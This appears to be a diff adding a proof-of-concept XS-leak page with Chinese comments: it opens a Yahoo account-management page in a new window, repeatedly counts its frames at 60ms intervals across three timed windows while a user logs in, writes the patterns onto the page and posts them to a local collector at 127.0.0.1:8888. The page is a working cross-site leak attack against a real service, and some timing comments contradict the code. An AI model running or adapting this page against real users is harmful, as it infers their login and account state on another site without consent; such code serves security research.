@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+  <head>
+    <meta charset="utf-8">
+    <link rel="stylesheet">
+    <title>xs-leaks attack page</title>
+  </head>
+
+  <style>
+    .sm-item {
+      display: flex;
+      flex-flow: row nowrap;
+      padding-left: 16px;
+      font-size: 1.6rem;
+    }
+    .item-text{
+        flex: 1 1 auto;
+        margin: 11px 8px 11px 16px;
+        font-family: inherit !important;
+        /*超过宽度，自动换行*/
+        white-space: pre-wrap;
+        word-wrap: break-word;
+      }
+  </style>
+
+  <body style="height: 100%;">
+    <h1>XS-leaks through frame counting</h1>
+    <p>This is a page to contact login page.</p>
+    
+   <script type="text/javascript">
+      //第一次打开页面记录iframe
+      var win = window.open("https://login.yahoo.com/manage_account?pspid=159600001&activity=mail-direct&.lang=en-US&.intl=us&src=ym&signin=true&done=https%3A%2F%2Fmail.yahoo.com%2Fd&eid=100");
+      var pattern1 = [];
+      // In a loop, register the number of iframes at 60ms interval
+      var recorder = setInterval(() => {
+        pattern1.push(win.length)
+      }, 60);
+
+      // Break the loop after 6 seconds
+      setTimeout(() => {
+         clearInterval(recorder);
+         console.log("The pattern1 is:", pattern1.join(', '));
+      }, 6 * 1000); 
+  
+      //12秒后等待用户登录后再记录iframe
+      setTimeout(twiceOpen,12 * 1000);
+      function twiceOpen(){
+        var pattern2 = [];
+        // In a loop, register the number of iframes at 60ms interval
+        var recorder = setInterval(() => {
+          pattern2.push(win.length)
+        }, 60);
+  
+        // Break the loop after 18 seconds
+        setTimeout(() => {
+           clearInterval(recorder);
+           console.log("The pattern2 is:", pattern2.join(', '));
+        }, 6 * 1000);
+      }
+
+      //36秒后等待用户登录后再记录iframe
+      setTimeout(thirdOpen,36 * 1000);
+      function thirdOpen(){
+        var pattern3 = [];
+        // In a loop, register the number of iframes at 60ms interval
+        var recorder = setInterval(() => {
+          pattern3.push(win.length)
+        }, 60);
+  
+        // Break the loop after 42 seconds
+        setTimeout(() => {
+           clearInterval(recorder);
+           console.log("The pattern3 is:", pattern3.join(', '));
+        }, 6 * 1000);
+      }
+    </script>
+
+    <!--打印读取页面iframe数-->
+    <div class="sm-item" id="data">
+    </div>
+    <input type="submit" value="submit" onclick="submit()">
+    <p id="result"></p>
+
+    <script>
+      //将控制台内容打印在div,pre内（打印在页面上）
+      (function () {
+        var old = console.log;
+        var logger = document.getElementById('data');
+        console.log = function () {
+          for (var i = 0; i < arguments.length; i++) {
+            if (typeof arguments[i] == 'object') {
+                logger.innerHTML += (JSON && JSON.stringify ? JSON.stringify(arguments[i], undefined, 2) : arguments[i]) + '<br />';
+            } else {
+                logger.innerHTML += arguments[i] + '<br />';
+            }
+          }
+        }
+    })();
+    </script>
+    
+    <script type="text/javascript">
+        function submit(){
+          //发送ajax请求
+
+          var data = document.getElementById('data').innerHTML;
+          var ajax = new XMLHttpRequest();
+
+          ajax.open('post','http://127.0.0.1:8888/test.json',true)
+          ajax.send(data)
+
+          ajax.onreadystatechange = function(){
+            if(ajax.readyState ==4 && ajax.status ==200){
+                //本次请求成功
+                document.getElementById("result").innerHTML = "sucesss" 
+            }else{
+                //本次请求失败
+                document.getElementById("result").innerHTML = "fail" 
+            }
+          }
+        }
+       
+    </script>
+    
+  </body>
+</html>
